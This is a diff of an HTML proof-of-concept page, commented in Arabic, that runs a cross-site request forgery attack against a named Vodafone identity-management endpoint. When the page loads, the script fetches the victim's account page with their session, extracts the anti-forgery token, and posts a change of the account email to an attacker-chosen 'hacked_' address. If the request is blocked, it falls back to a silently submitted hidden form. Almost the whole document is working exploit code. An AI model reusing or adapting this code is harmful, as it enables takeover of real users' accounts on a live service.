@@ -1,12 +1,14 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
+    <meta charset="UTF-8">
     <title>PoC Executing...</title>
 </head>
 <body>
-    <div id="msg" style="font-family: sans-serif; padding: 20px; font-weight: bold;">Initializing...</div>
+    <div id="msg" style="font-family: sans-serif; font-weight: bold; padding: 20px;">Initializing...</div>
 
     <script>
+        // المتغيرات الأساسية
         const target = "https://identity.facilitymanagement.iot.vodafone.gr/identity/Manage";
 
         async function executePackageDoom() {
@@ -21,11 +23,11 @@
                 const token = doc.querySelector('input[name="__RequestVerificationToken"]')?.value;
 
                 if (!token) {
-                    document.getElementById('msg').innerText = "❌ Token missing! (Session expired or Not Logged In)";
+                    document.getElementById('msg').innerText = "❌ Token missing! (Are you logged in to Vodafone?)";
                     return;
                 }
 
-                document.getElementById('msg').innerText = "Step 2: Bypassing Security & Sending Payload...";
+                document.getElementById('msg').innerText = "Step 2: Token Captured! Executing CSRF Attack...";
 
                 const newEmail = `hacked_${Math.random().toString(36).substring(7)}@vodafone-poc.io`;
                 
@@ -44,7 +46,7 @@
                     '__RequestVerificationToken': token 
                 };
 
-                // محاولة الإرسال عبر Fetch أولاً
+                // محاولة الإرسال عبر Fetch
                 let formBody = [];
                 for (let property in details) {
                     formBody.push(encodeURIComponent(property) + "=" + encodeURIComponent(details[property]));
@@ -58,21 +60,23 @@
                     credentials: 'include'
                 });
 
-                // إذا فشل الـ Fetch (CORS Block) أو أعطى 400، ننتقل للفورم الصامت
+                // إذا فشل الـ Fetch (CORS/400)، ننتقل للفورم الصامت فوراً
                 if (postRes.status === 400 || !postRes.ok) {
-                     document.getElementById('msg').innerText = "⚠️ Fetch blocked or 400. Launching Silent Form Hijack...";
-                     setTimeout(() => { submitSilentForm(details); }, 1500);
+                    document.getElementById('msg').innerText = "⚠️ Fetch blocked. Using Fallback Form...";
+                    setTimeout(() => { submitSilentForm(details); }, 1000);
                 } else {
-                     document.getElementById('msg').innerHTML = "<h2 style='color:green'>✅ Success! Check account.</h2>";
+                    document.getElementById('msg').innerHTML = "<h2 style='color:green'>✅ Success! Check your account.</h2>";
                 }
 
             } catch (err) {
                 document.getElementById('msg').innerText = "❌ Error: " + err.message;
-                // محاولة أخيرة بالفورم حتى لو صار خطأ في الـ Fetch
-                console.log("Attempting fallback form due to error...");
+                // في حال حدوث أي خطأ، جرب الفورم كخيار أخير
+                const backupEmail = `backup_${Math.random().toString(36).substring(7)}@vodafone.io`;
+                // submitSilentForm({...details, Email: backupEmail}); 
             }
         }
 
+        // دالة الفورم الصامت (القاضية)
         function submitSilentForm(data) {
             const form = document.createElement('form');
             form.method = 'POST';
@@ -88,9 +92,10 @@
             form.submit();
         }
 
-        // --- السطر الناقص اللي بيشغل كل شي ---
-        window.onload = executePackageDoom;
-
+        // --- هاد السطر هو اللي بيشغل كل الحفلة ---
+        window.onload = function() {
+            executePackageDoom();
+        };
     </script>
 </body>
 </html>
